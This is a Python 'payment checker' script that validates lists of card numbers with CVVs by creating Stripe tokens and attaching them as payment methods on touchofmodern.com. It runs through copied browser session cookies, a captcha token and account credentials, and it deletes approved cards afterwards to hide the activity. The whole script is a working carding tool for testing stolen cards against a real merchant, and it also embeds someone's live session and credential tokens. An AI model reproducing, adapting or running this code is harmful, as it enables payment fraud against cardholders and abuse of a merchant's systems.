import requests
import json
from colorama import init, Fore, Back, Style
import time
import os

# Initialize colorama for Windows compatibility
init(autoreset=True)

# Statistics tracker
stats = {
    'total': 0,
    'approved': 0,
    'declined': 0,
    'unknown': 0,
    'errors': 0
}

def print_banner():
    """Display a colorful banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}    🔥 ADVANCED PAYMENT CHECKER 🔥    
{Fore.GREEN}    ✅ Combo List Support | 📊 Live Stats    
{Fore.CYAN}{'='*70}
{Style.RESET_ALL}"""
    print(banner)

def print_status(message, status_type="info"):
    """Print colored status messages"""
    colors = {
        "success": Fore.GREEN,
        "error": Fore.RED,
        "warning": Fore.YELLOW,
        "info": Fore.CYAN,
        "processing": Fore.MAGENTA
    }
    icon = {
        "success": "✅",
        "error": "❌",
        "warning": "⚠️",
        "info": "ℹ️",
        "processing": "⚡"
    }
    print(f"{colors.get(status_type, Fore.WHITE)}{icon.get(status_type, '•')} {message}{Style.RESET_ALL}")

def print_stats():
    """Print current statistics"""
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.YELLOW}📊 LIVE STATISTICS")
    print(f"{Fore.CYAN}{'='*50}")
    print(f"{Fore.WHITE}🎯 Total Checked: {stats['total']}")
    print(f"{Fore.GREEN}✅ Approved: {stats['approved']}")
    print(f"{Fore.RED}❌ Declined: {stats['declined']}")
    print(f"{Fore.YELLOW}⚠️ Unknown: {stats['unknown']}")
    print(f"{Fore.MAGENTA}🔴 Errors: {stats['errors']}")
    
    if stats['total'] > 0:
        success_rate = (stats['approved'] / stats['total']) * 100
        print(f"{Fore.CYAN}📈 Success Rate: {success_rate:.1f}%")
    
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

def parse_card_data(card_input):
    """Parse card data from input format: number|month|year|cvv"""
    try:
        parts = card_input.strip().split('|')
        if len(parts) != 4:
            return None
        
        card_number = parts[0].strip()
        exp_month = parts[1].strip().zfill(2)
        exp_year = parts[2].strip()
        cvv = parts[3].strip()
        
        # Validate card number
        if not card_number.isdigit() or len(card_number) < 13:
            return None
            
        # Validate month
        if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
            return None
            
        # Validate year (convert to 2-digit if 4-digit)
        if len(exp_year) == 4:
            exp_year = exp_year[-2:]
        elif len(exp_year) != 2:
            return None
            
        # Validate CVV
        if not cvv.isdigit() or len(cvv) < 3:
            return None
            
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvv': cvv
        }
    except Exception:
        return None

def create_stripe_token(card_data):
    """Create Stripe token for the card"""
    headers = {
        'accept': 'application/json',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'dnt': '1',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    # قم بلصق بيانات 'data' الطويلة هنا
    data = (
        f'guid=580a35aa-b787-451b-b8cd-a696e2523b349d2acc&'
        f'muid=b6c0958e-a79c-4777-878f-484734d10808a0e91d&'
        f'sid=a5966fb2-2b1f-4a16-b99b-a8c6661190777a7744&'
        f'referrer=https%3A%2F%2Fwww.touchofmodern.com&'
        f'time_on_page=397160&'
        f'card[name]=Card+details+saad&'
        f'card[address_line1]=111+North+Street&'
        f'card[address_line2]=&'
        f'card[address_city]=Napoleon&'
        f'card[address_state]=HU&'
        f'card[address_zip]=49261-9011&'
        f'card[address_country]=EG&'
        f'card[number]={card_data["number"]}&'
        f'card[cvc]={card_data["cvv"]}&'
        f'card[exp_month]={card_data["exp_month"]}&'
        f'card[exp_year]={card_data["exp_year"]}&'
        f'radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU1MjM0MzU3LCJjZGF0YSI6IjhzeS95Z2tTRnFwdjJSaHJQRGNDZGtjM0IxWW05dEZTakFCVHlIKzVyT2pJeFFPVUJWRTZYUzZ2OTRJOXdXb3Z0RlNTbGtaSjZabjF0OUs2T2JNbjVqYjZJUWsxQVFBZTRONUYzMTAxSDliR3hKcWU5M1JnT3RvMUhGZEVDYTBya3ErTHdySkxaWU1LQVRJUENML1hhWUJSdjFoaXVlUi8rTkNZVzJBdFlTMnNpck41MXpYb2RKSmc4L2swb3lZazJSNkZOdk1RZ3gzRDRXRTkiLCJwYXNza2V5IjoiRXZ2a3lTdnFQWXh5Z2ROdG4xTmVkMkJ6WS96eXYzMGxYclFUK3g5YWdNeHQwZGNXcnJzanNiWEY2Nm5iRDhqYURpMWtzMnNOUGVIbkZpcnIra0F1bWowZE80SmpVTXlmMDY2cGpaRkNFd0pRNXIzdk85VHU3SFRZSlIydDF2cmxBSXFrSXVGZWZ2c3o2d2hrelNxUVg0Wm5jaFkvbmhZb0hzMjNIQ2lDcVJNeHZIOFRQSnR4QW5TVDk3dm1aQkd5TXc1SzVRQjA5Z3pXcEt5QUpjS2FNQkRaT1lXYlAwbGllVnd2blNhQTR1dDNpNlRLTENDSk95UDE1KzltbVM2eHhHRkhhZnlLbEtoNTdnc2VxdlVMZjVid3BqZEZVdWNmWG4zVkVNT09zV2tHeVdzTmVjVWdCUmNsc0FTTjNWUnhLazg5cWZFMDNxRWNLZ01ocGRCTU8xeGJTMHpmOEhsOVpVV1pSR0dRS3VZODZlTDNjaWltOTFXcm80YVpla3V1b2V2ZnJ0K0U2L2hkaUhmeHlpOUpsN1VCVkxiZVZBSXROQjFTOVFubWY2VHFyS0szOXY5dGFicGJJWGRXOTVTQ0V3YkVJV21nNXVMeFg3SjNFTkVXdlVEZnRaVTc0eks1Tm9OSzBzMWozZXRMekZvM0J6QjBKSXdvYmp5ZG5VM2h3akxjRTNCZFpJcHFBMG1ZMUZzZkNKek5jWloyelpSNk1XZ0lDWm94MU1LbTc5MWF4U0hPRUJNcll1WWhUTkFlWnhHZmhZcmVKRkhGZklEZzNZRUk5V29yaEUrQjZWN2ZFcVpZSmVjMUtXa09BeW1TaDBFMDR0aUFjTkt6dE1QUWtNR05WaG50a3dhV29wVENHQ1dyZ2pKa1RSMm13SE5KM1E1WTQ3MkxGck9RbzZESzZ0UXlmOWdWNC9nZXpoMmZiVStEVFYyb2REQ2JMbGkyTFFDVm0rdXZ0V0pwRlY1RktlM3V4T2REemUvSklMNHFJU0hmWk9ycFAyN0RLdVRjRW5EWVg0M2g5dzVlaHlvQnowK0F0Q3dZUzJFUWcydnd3OFJtblpXMjBUc2h5eHJscFo1Sk5nOUhUenlmUGpOTi9RNkVwU3kwZzlSQ2lPL2hOdEtBNVJYeXAwelpIRWFWaVVmL25pM3paZTdjaFhsckluT0FUOXVXTHd6MjZISk5WMFM2eFlHNFFybWNKS1RSQ3ZlcEpqMi9NWEFRQ244MWUzZDJYa3ArQmJqNGJxbGROelJKYkd1aGF2R1MxQmIycFZRZXdqVUVXSmZXUmd1eEJDaXY4V3Z1WEQzMlpqUnV3emhjWkNBRjUxL2pXTDFjOWdjcW45bm90bGMxeitJV3YzdDBWeHpWM0k3ZUNSeWd3MWd0OW5DZmJqejNWL3hKVlBtellmcXQwbUZSM0VSLzhuRVNiU3BQR2lWQTlLNmVTeExMR3Rwd2xNVzBsOWpXLzMrdTNWdDBDZkJQMEwvNjZRVm01Z0VOR3BaNldkTWpUODAzWERkM1dKQW9RWjN0V2poNmY2WEVyRHlVRnF4RVBsbGNvNUwxZXpINloxTVlYcnBOcEhBWlQ5RW5aNTVlbldzV3J0UVNVNWpCRDgzS1ZFaEFRYUFjL3d1a0hzNVV3b05wRUgwZVY5ZlNGL2Q2QnpCZ2Y0akpWUUpFWjhYZExwQkUwdTRscmp6RUpDM3ZJYlhqbDhiRTdwWXF0ZE04b3UzYThqa1BiVEdheVd3YldGa2JVbUJPdTJnUE9wRVpad3hqTnRGRVZNQnkxOUlpeCs0cjdKOGxBcllhUWVQRDFiR2xZTlZtNzBSbHExejVLeTF2aTBwc0g1bVl4b3RkL3NQc3lZN21UQXlkT0xzYTFaejBHN3A0WlAwdFJVRTltS0tGcEhCQzIxV1lqMW01ZkI1L0JtdENXV1lKU2VUd1packxqeEhqWXd4MjVnZDUxdzZ6TE9nT1orSkVtb0hUbm4xY2dMODBVWXpWRFZ6d3F1ZWZiUnl1ZEZCVHc3bjRSaVpUb2hnYnR3Z1VPMlYwemxiTlozeHE4UnErUTBmaXFFYlZDUXlxMTNxQlpTQy9OYzg1UkJVNU9ZaVFQRU9tM3RrKzlUME5wMEFhS2ovVXNJL0lYT09QWGxMSWt1S3V4Qk5JWm00OGgvYTRFNENzZFpFK1Y1OCtNTXdTYnF4U0VzdGdYeFArVVBrWWNUcWEzM0VpWWFTQWk5NFAvS0lmUmF5N0FSY0pKRVZDbDVBPSIsImtyIjoiM2FjNGI5YTQiLCJzaGFyZF9pZCI6NTM1NzY1NTl9.SSGIeN_vtjwh0F7_BUDFWEtWhvtNuSDvcLbre2x2kIk&'
        f'payment_user_agent=stripe.js%2F0f795842d4%3B+stripe-js-v3%2F0f795842d4%3B+card-element&'
        f'pasted_fields=number&'
        f'key=pk_live_XXpyPtvC4hlPcTAddDCFYLa1'
    )

    try:
        response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, timeout=30)
        
        if response.status_code == 200:
            response_data = response.json()
            if 'id' in response_data:
                return response_data['id']
        return None
            
    except requests.exceptions.RequestException:
        return None

def process_payment(token):
    """Process payment with the token"""
    # قم بلصق بيانات 'cookies' الطويلة هنا
    cookies = {
        '_vuid': '425928a2-b9b2-439f-acb4-d7979ac70e20',
        'bttomo_uuid': 'b5440418-4f93-4c7c-9e14-0562b7422002',
        '_dpm_ses.cc1e': '*',
        '_vwo_uuid_v2': 'D1D3CEB36EF6B8D3DBB919272C421346A|5eaad96620832fb35f678da54b21fcb9',
        '__utma': '11954097.1888998679.1755233307.1755233307.1755233307.1',
        '__utmc': '11954097',
        '__utmz': '11954097.1755233307.1.1.utmcsr=chatgpt.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '_ga': 'GA1.1.1263879765.1755233307',
        '_tt_enable_cookie': '1',
        '_ttp': '01K2P0XYTB3C46PTE8PNV2AJ5D_.tt.1',
        'maId': '{"cid":"unknown","sid":"f51a0640-48d4-4915-984d-05c7e7814c1f","isSidSaved":false,"sessionStart":"2025-08-15T04:48:41.000Z"}',
        '_fbp': 'fb.1.1755233322083.80026847641978976',
        '_pin_unauth': 'dWlkPU5HWTNaV05sTVRZdE5HUTFPQzAwTWpBeUxUbGpZMlF0T0RRNVpXTTBZVGxsTjJVNQ',
        'GSIDCvda0iy8VnTo': 'd906c8bb-0e1f-4de5-adfc-ef7402350c30',
        'STSID208080': 'f621068d-f755-4454-b021-0fafa7c86acf',
        '_vuid': '425928a2-b9b2-439f-acb4-d7979ac70e20',
        '_cb': 'BUrqwhCPH63BqY2Jh',
        '_cb_svref': 'https%3A%2F%2Fchatgpt.com%2F',
        'user_credentials': '21fe1287d531c5c21daa99f20a8a6b321bcaa8c2be547020e8b6199cd8b16fc6c59f0f00768700c6537574205355c47fd72fd02426b306544f7deb2c29619ed1%3A%3A28285490%3A%3A2030-08-14T21%3A53%3A33-07%3A00',
        '__stripe_mid': 'b6c0958e-a79c-4777-878f-484734d10808a0e91d',
        '__stripe_sid': 'a5966fb2-2b1f-4a16-b99b-a8c6661190777a7744',
        'ltkpopup-session-depth': '3-3',
        '_dpm_id.cc1e': '47e9bc61-9bc0-4816-b829-a253b321c675.1755233306.1.1755233840.1755233306.de147932-f769-4a18-8acf-2abeb3a08bc9',
        '__utmb': '11954097.30.6.1755233839807',
        '_ga_ZQ7RLDC57L': 'GS2.1.s1755233307$o1$g1$t1755233839$j55$l0$h0',
        'cto_bundle': 'N7DiMl9sNFNidzAxZWxaS09SM2RXbkt1TFVPWkRhJTJGdm0zRTlKZHM5d2FWVDRQZll5b2liSXY1VGFQTGdSM2NubVpzM1hoVDlWTnE1QyUyRkY0andEOHRZeVgxSTV4SiUyQkVEOEhwcEVsaThhNnBQMUx6Mmw0ZktIRmVaRHppYTZzcnQwdVZrbDFhWlNIdHhpM3ZFJTJGNGI2YkFkYnVHTkNtVk0lMkJIOHB3VUNyTllDTDVTSThDb3hBTnBuQzJxOE4wbGIlMkZxdEU3MnZNS3hzdXpWaWtLVGJWT0Npemk5aXFBJTNEJTNE',
        'ttcsid': '1755233319757::eg2SwT_ENS_oJcXJv-qw.1.1755233840182',
        '_uetsid': '1dd320c0799311f0ac5303e1c7959096|1lw0pnf|2|fyh|0|2053',
        'ttcsid_C8CIRRM5JLPVEHN4GRR0': '1755233319757::i7dzxy1-lt5-a_gEV8Nv.1.1755233840487',
        '_uetvid': '1dd329f0799311f0a2fecd0082d927d5|sq9z6r|1755233840651|6|1|bat.bing.com/p/insights/c/j',
        '_touchofmodern_session': 'BAh7DEkiD3Nlc3Npb25faWQGOgZFVEkiJTlkMzRhZmVhZmY0YTFhMDRmNzJiMmZhY2UwNzAzNGYxBjsAVEkiDnNlc3Npb25fcwY7AEZpBkkiEF9jc3JmX3Rva2VuBjsARkkiMTArR2lkZjdwTFhTM2NQTUxPaDg3V3pKSmtsVWJxclV0MGtFcGMrK0RvUFE9BjsARkkiEHJlZ19pcG9ud2ViBjsARmkGSSIVdXNlcl9jcmVkZW50aWFscwY7AFRJIgGAMjFmZTEyODdkNTMxYzVjMjFkYWE5OWYyMGE4YTZiMzIxYmNhYThjMmJlNTQ3MDIwZThiNjE5OWNkOGIxNmZjNmM1OWYwZjAwNzY4NzAwYzY1Mzc1NzQyMDUzNTVjNDdmZDcyZmQwMjQyNmIzMDY1NDRmN2RlYjJjMjk2MTllZDEGOwBUSSIYdXNlcl9jcmVkZW50aWFsc19pZAY7AFRpBDKarwFJIgtnYV9zdWIGOwBGVA%3D%3D--b6755d7c06ab7075aff711c893f0f4f0af98a7bd',
        '_chartbeat2': '.1755233328385.1755233844477.1.CnB-CFCbRtNFCccHK7DpMUMd1b1oq.4',
        '_dd_s': 'logs=1&id=b459285d-9cc6-4475-82e1-42af9d7ef59f&created=1755233306209&expire=1755235137718',
    }
    
    # قم بلصق بيانات 'headers' الطويلة هنا
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.touchofmodern.com',
        'priority': 'u=1, i',
        'referer': 'https://www.touchofmodern.com/v2/payment_methods/new',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    json_data = {
        'card': {
            'payment_method': 'stripe',
            'processor': 'stripe',
            'stripe_token': token,
        },
        'billing_method': {
            'nickname': '',
        },
    }

    try:
        response = requests.post('https://www.touchofmodern.com/v2/payment_methods.json', 
                               cookies=cookies, headers=headers, json=json_data, timeout=30)
        return response
    except requests.exceptions.RequestException:
        return None

def delete_payment_method(payment_method_id):
    """Delete a payment method by its ID"""
    # قم بلصق بيانات 'cookies' الطويلة هنا (نفس الكوكيز المستخدمة في process_payment)
    cookies = {
        '_vuid': '425928a2-b9b2-439f-acb4-d7979ac70e20',
        'bttomo_uuid': 'b5440418-4f93-4c7c-9e14-0562b7422002',
        '_dpm_ses.cc1e': '*',
        '_vwo_uuid_v2': 'D1D3CEB36EF6B8D3DBB919272C421346A|5eaad96620832fb35f678da54b21fcb9',
        '__utma': '11954097.1888998679.1755233307.1755233307.1755233307.1',
        '__utmc': '11954097',
        '__utmz': '11954097.1755233307.1.1.utmcsr=chatgpt.com|utmccn=(referral)|utmcmd=referral|utmcct=/',
        '_ga': 'GA1.1.1263879765.1755233307',
        '_tt_enable_cookie': '1',
        '_ttp': '01K2P0XYTB3C46PTE8PNV2AJ5D_.tt.1',
        'maId': '{"cid":"unknown","sid":"f51a0640-48d4-4915-984d-05c7e7814c1f","isSidSaved":false,"sessionStart":"2025-08-15T04:48:41.000Z"}',
        '_fbp': 'fb.1.1755233322083.80026847641978976',
        '_pin_unauth': 'dWlkPU5HWTNaV05sTVRZdE5HUTFPQzAwTWpBeUxUbGpZMlF0T0RRNVpXTTBZVGxsTjJVNQ',
        'GSIDCvda0iy8VnTo': 'd906c8bb-0e1f-4de5-adfc-ef7402350c30',
        'STSID208080': 'f621068d-f755-4454-b021-0fafa7c86acf',
        '_vuid': '425928a2-b9b2-439f-acb4-d7979ac70e20',
        '_cb': 'BUrqwhCPH63BqY2Jh',
        '_cb_svref': 'https%3A%2F%2Fchatgpt.com%2F',
        'user_credentials': '21fe1287d531c5c21daa99f20a8a6b321bcaa8c2be547020e8b6199cd8b16fc6c59f0f00768700c6537574205355c47fd72fd02426b306544f7deb2c29619ed1%3A%3A28285490%3A%3A2030-08-14T21%3A53%3A33-07%3A00',
        '__stripe_mid': 'b6c0958e-a79c-4777-878f-484734d10808a0e91d',
        '__stripe_sid': 'a5966fb2-2b1f-4a16-b99b-a8c6661190777a7744',
        'ltkpopup-session-depth': '3-3',
        '_dpm_id.cc1e': '47e9bc61-9bc0-4816-b829-a253b321c675.1755233306.1.1755233840.1755233306.de147932-f769-4a18-8acf-2abeb3a08bc9',
        '__utmb': '11954097.30.6.1755233839807',
        '_ga_ZQ7RLDC57L': 'GS2.1.s1755233307$o1$g1$t1755233839$j55$l0$h0',
        'cto_bundle': 'N7DiMl9sNFNidzAxZWxaS09SM2RXbkt1TFVPWkRhJTJGdm0zRTlKZHM5d2FWVDRQZll5b2liSXY1VGFQTGdSM2NubVpzM1hoVDlWTnE1QyUyRkY0andEOHRZeVgxSTV4SiUyQkVEOEhwcEVsaThhNnBQMUx6Mmw0ZktIRmVaRHppYTZzcnQwdVZrbDFhWlNIdHhpM3ZFJTJGNGI2YkFkYnVHTkNtVk0lMkJIOHB3VUNyTllDTDVTSThDb3hBTnBuQzJxOE4wbGIlMkZxdEU3MnZNS3hzdXpWaWtLVGJWT0Npemk5aXFBJTNEJTNE',
        'ttcsid': '1755233319757::eg2SwT_ENS_oJcXJv-qw.1.1755233840182',
        '_uetsid': '1dd320c0799311f0ac5303e1c7959096|1lw0pnf|2|fyh|0|2053',
        'ttcsid_C8CIRRM5JLPVEHN4GRR0': '1755233319757::i7dzxy1-lt5-a_gEV8Nv.1.1755233840487',
        '_uetvid': '1dd329f0799311f0a2fecd0082d927d5|sq9z6r|1755233840651|6|1|bat.bing.com/p/insights/c/j',
        '_touchofmodern_session': 'BAh7DEkiD3Nlc3Npb25faWQGOgZFVEkiJTlkMzRhZmVhZmY0YTFhMDRmNzJiMmZhY2UwNzAzNGYxBjsAVEkiDnNlc3Npb25fcwY7AEZpBkkiEF9jc3JmX3Rva2VuBjsARkkiMTArR2lkZjdwTFhTM2NQTUxPaDg3V3pKSmtsVWJxclV0MGtFcGMrK0RvUFE9BjsARkkiEHJlZ19pcG9ud2ViBjsARmkGSSIVdXNlcl9jcmVkZW50aWFscwY7AFRJIgGAMjFmZTEyODdkNTMxYzVjMjFkYWE5OWYyMGE4YTZiMzIxYmNhYThjMmJlNTQ3MDIwZThiNjE5OWNkOGIxNmZjNmM1OWYwZjAwNzY4NzAwYzY1Mzc1NzQyMDUzNTVjNDdmZDcyZmQwMjQyNmIzMDY1NDRmN2RlYjJjMjk2MTllZDEGOwBUSSIYdXNlcl9jcmVkZW50aWFsc19pZAY7AFRpBDKarwFJIgtnYV9zdWIGOwBGVA%3D%3D--b6755d7c06ab7075aff711c893f0f4f0af98a7bd',
        '_chartbeat2': '.1755233328385.1755233844477.1.CnB-CFCbRtNFCccHK7DpMUMd1b1oq.4',
        '_dd_s': 'logs=1&id=b459285d-9cc6-4475-82e1-42af9d7ef59f&created=1755233306209&expire=1755235137718',
    }
    
    # قم بلصق بيانات 'headers' الطويلة هنا (نفس الهيدرز المستخدمة في process_payment)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://www.touchofmodern.com',
        'priority': 'u=1, i',
        'referer': 'https://www.touchofmodern.com/v2/payment_methods/new',
        'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    }

    try:
        delete_url = f'https://www.touchofmodern.com/v2/payment_methods/{payment_method_id}.json'
        response = requests.delete(delete_url, cookies=cookies, headers=headers, timeout=30)
        if response.status_code == 204: # 204 No Content is typical for successful DELETE
            print(f"{Fore.GREEN}✅ Successfully deleted payment method ID: {payment_method_id}{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.YELLOW}⚠️ Failed to delete payment method ID: {payment_method_id}. Status: {response.status_code}, Response: {response.text[:100]}{Style.RESET_ALL}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}❌ Error deleting payment method ID: {payment_method_id}. Error: {e}{Style.RESET_ALL}")
        return False

def analyze_response_simple(response, card_data):
    """Improved response analysis with short output and payment method ID extraction"""
    masked_card = f"{card_data['number'][:4]}****{card_data['number'][-4:]}"
    payment_method_id = None # Initialize to None

    if response is None:
        print(f"{Fore.RED}❌ {masked_card} - Connection Error{Style.RESET_ALL}")
        stats['errors'] += 1
        return "error", None
    
    try:
        response_data = response.json()
        response_text = str(response_data).lower()

        # Check for successful payment method creation based on your provided JSON
        if response.status_code == 200 and 'billing_method' in response_data and 'id' in response_data['billing_method']:
            payment_method_id = response_data['billing_method']['id']
            print(f"{Fore.GREEN}✅ {masked_card} - APPROVED ✅ (ID: {payment_method_id}){Style.RESET_ALL}")
            stats['approved'] += 1
            return "approved", payment_method_id
        
        # Check for decline indicators
        decline_indicators = [
            "your card was declined", "card declined", "declined", 
            "invalid card", "insufficient funds", "error", "failure", "fail"
        ]
        
        declined = any(indicator in response_text for indicator in decline_indicators)
        
        if declined or response.status_code == 422:
            print(f"{Fore.RED}❌ {masked_card} - DECLINED{Style.RESET_ALL}")
            stats['declined'] += 1
            return "declined", None
        else:
            # Unknown response - print full details
            print(f"{Fore.YELLOW}⚠️ {masked_card} - UNKNOWN RESPONSE{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Status: {response.status_code} | Response: {response.text[:100]}...{Style.RESET_ALL}")
            stats['unknown'] += 1
            return "unknown", None

    except json.JSONDecodeError:
        # If response is not JSON, treat as unknown or error based on status code
        response_text = response.text.lower()
        decline_indicators = [
            "your card was declined", "card declined", "declined", 
            "invalid card", "insufficient funds", "error", "failure", "fail"
        ]
        declined = any(indicator in response_text for indicator in decline_indicators)

        if declined or response.status_code == 422:
            print(f"{Fore.RED}❌ {masked_card} - DECLINED (Non-JSON Response){Style.RESET_ALL}")
            stats['declined'] += 1
            return "declined", None
        else:
            print(f"{Fore.YELLOW}⚠️ {masked_card} - UNKNOWN RESPONSE (Non-JSON){Style.RESET_ALL}")
            print(f"{Fore.CYAN}Status: {response.status_code} | Response: {response.text[:100]}...{Style.RESET_ALL}")
            stats['unknown'] += 1
            return "unknown", None
    except Exception as e:
        print(f"{Fore.RED}❌ {masked_card} - Error analyzing response: {e}{Style.RESET_ALL}")
        stats['errors'] += 1
        return "error", None

def check_single_card(card_data):
    """Check a single card"""
    stats['total'] += 1
    masked_card = f"{card_data['number'][:4]}****{card_data['number'][-4:]}"
    
    # Create token
    token = create_stripe_token(card_data)
    if not token:
        print(f"{Fore.RED}❌ {masked_card} - Token Creation Failed{Style.RESET_ALL}")
        stats['errors'] += 1
        return
    
    # Process payment
    response = process_payment(token)
    
    # Analyze response
    status, payment_method_id = analyze_response_simple(response, card_data)

    # If approved, attempt to delete the payment method
    if status == "approved" and payment_method_id:
        print(f"{Fore.CYAN}Attempting to delete payment method ID: {payment_method_id}...{Style.RESET_ALL}")
        delete_payment_method(payment_method_id)


def get_combo_list():
    """Get combo list from user"""
    print(f"\n{Fore.YELLOW}💳 COMBO LIST INPUT:{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Enter cards (format: number|month|year|cvv)")
    print(f"Press Enter twice to start checking{Style.RESET_ALL}\n")
    
    cards = []
    empty_lines = 0
    
    while True:
        try:
            card_input = input(f"{Fore.CYAN}Card {len(cards) + 1}: {Style.RESET_ALL}").strip()
            
            if not card_input:
                empty_lines += 1
                if empty_lines >= 2:
                    break
                continue
            else:
                empty_lines = 0
            
            card_data = parse_card_data(card_input)
            if card_data:
                cards.append(card_data)
                masked_card = f"{card_data['number'][:4]}****{card_data['number'][-4:]}"
                print(f"{Fore.GREEN}✅ Added: {masked_card}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ Invalid format! Skipping...{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            break
    
    return cards

def main():
    """Main function with continuous loop"""
    while True:
        print_banner()
        print_stats()
        
        print(f"\n{Fore.YELLOW}🔥 PAYMENT CHECKER OPTIONS:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}1. Check Single Card")
        print(f"2. Check Combo List")
        print(f"3. Reset Statistics")
        print(f"4. Exit Program{Style.RESET_ALL}\n")
        
        choice = input(f"{Fore.CYAN}Enter your choice (1-4): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            # Single card check
            card_input = input(f"{Fore.CYAN}Enter card (number|month|year|cvv): {Style.RESET_ALL}").strip()
            card_data = parse_card_data(card_input)
            
            if card_data:
                print(f"\n{Fore.MAGENTA}⚡ Checking card...{Style.RESET_ALL}")
                check_single_card(card_data)
            else:
                print_status("❌ Invalid card format!", "error")
            
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '2':
            # Combo list check
            cards = get_combo_list()
            
            if not cards:
                print_status("❌ No valid cards provided!", "error")
                input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                continue
            
            print(f"\n{Fore.MAGENTA}🚀 Starting combo list check - {len(cards)} cards{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Press Ctrl+C to stop checking{Style.RESET_ALL}\n")
            
            try:
                for i, card_data in enumerate(cards, 1):
                    print(f"{Fore.CYAN}[{i}/{len(cards)}]{Style.RESET_ALL}", end=" ")
                    check_single_card(card_data)
                    
                    # Show stats every 10 cards
                    if i % 10 == 0:
                        print_stats()
                        print(f"{Fore.YELLOW}⏳ Continuing in 2 seconds...{Style.RESET_ALL}")
                        time.sleep(2)
                    else:
                        time.sleep(1)  # Small delay between cards
                        
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ Checking stopped by user{Style.RESET_ALL}")
            
            print(f"\n{Fore.GREEN}✅ Combo list checking completed!{Style.RESET_ALL}")
            print_stats()
            input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
            
        elif choice == '3':
            # Reset statistics
            stats['total'] = 0
            stats['approved'] = 0
            stats['declined'] = 0
            stats['unknown'] = 0
            stats['errors'] = 0
            print_status("✅ Statistics reset!", "success")
            time.sleep(1)
            
        elif choice == '4':
            # Exit program
            print(f"\n{Fore.GREEN}✅ Final Statistics:{Style.RESET_ALL}")
            print_stats()
            print(f"\n{Fore.YELLOW}👋 Thanks for using Payment Checker!{Style.RESET_ALL}")
            break
            
        else:
            print_status("❌ Invalid choice! Please select 1-4", "error")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ Program interrupted by user{Style.RESET_ALL}")
        print(f"\n{Fore.GREEN}✅ Final Statistics:{Style.RESET_ALL}")
        print_stats()
    except Exception as e:
        print_status(f"❌ Unexpected error: {str(e)}", "error")
